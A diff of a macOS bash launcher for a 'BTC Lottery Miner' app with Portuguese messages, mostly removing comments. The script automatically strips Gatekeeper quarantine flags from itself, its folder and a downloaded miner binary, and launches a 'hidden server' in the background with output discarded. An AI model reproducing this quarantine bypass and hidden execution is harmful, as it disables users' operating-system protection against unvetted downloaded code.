@@ -1,10 +1,8 @@
 #!/bin/bash
-cd "$(dirname "$0")"
+cd "$(dirname "$0")/componentes"
 
-# Adiciona caminhos padrao do Node.js no Mac (Homebrew, NVM, /usr/local/bin)
 export PATH="/usr/local/bin:/opt/homebrew/bin:$HOME/.nvm/versions/node/$(ls $HOME/.nvm/versions/node 2>/dev/null | tail -n 1)/bin:$PATH"
 
-# Remove atributo de quarentena do Gatekeeper do macOS automaticamente
 xattr -d com.apple.quarantine "$0" 2>/dev/null
 xattr -rd com.apple.quarantine . 2>/dev/null
 chmod +x "$0" 2>/dev/null
@@ -14,7 +12,6 @@ echo "  Software BTC Lottery Miner - Mac OS"
 echo "========================================="
 echo ""
 
-# Verifica se o Node.js esta instalado
 if ! command -v node >/dev/null 2>&1; then
     echo "[!] Node.js nao foi encontrado no seu Mac!"
     echo "[!] O motor Node.js e necessario para a interface."
@@ -25,19 +22,17 @@ if ! command -v node >/dev/null 2>&1; then
     echo ""
     echo "PASSOS:"
     echo "1. Baixe o instalador (.pkg) no site que abriu e instale."
-    echo "2. Clique neste arquivo INICIAR.command novamente apos instalar."
+    echo "2. Clique neste arquivo INICIAR novamente apos instalar."
     echo ""
     read -p "Pressione Enter para sair..."
     exit 1
 fi
 
-# Instala as dependencias se necessario
 if [ ! -d "node_modules" ]; then
     echo "[+] Instalando dependencias do sistema..."
     npm install
 fi
 
-# Baixa o minerador especifico para Mac caso nao exista
 if [ ! -f "miner/minerd-mac" ]; then
     echo "[+] Baixando motor de mineracao otimizado para Mac..."
     mkdir -p miner/temp_mac
@@ -49,16 +44,13 @@ if [ ! -f "miner/minerd-mac" ]; then
     rm -rf miner/temp_mac
 fi
 
-# Garante permissao de execucao e remove quarentena do binario
 chmod +x miner/minerd-mac 2>/dev/null
 xattr -d com.apple.quarantine miner/minerd-mac 2>/dev/null
 
-# Inicia o servidor Node em background
 echo "[+] Iniciando o Servidor Oculto..."
 pkill -f "node server.js" 2>/dev/null
 nohup node server.js > /dev/null 2>&1 &
 
-# Abre o navegador
 echo "[+] Abrindo o painel no navegador..."
 sleep 2
 open "http://localhost:3500"
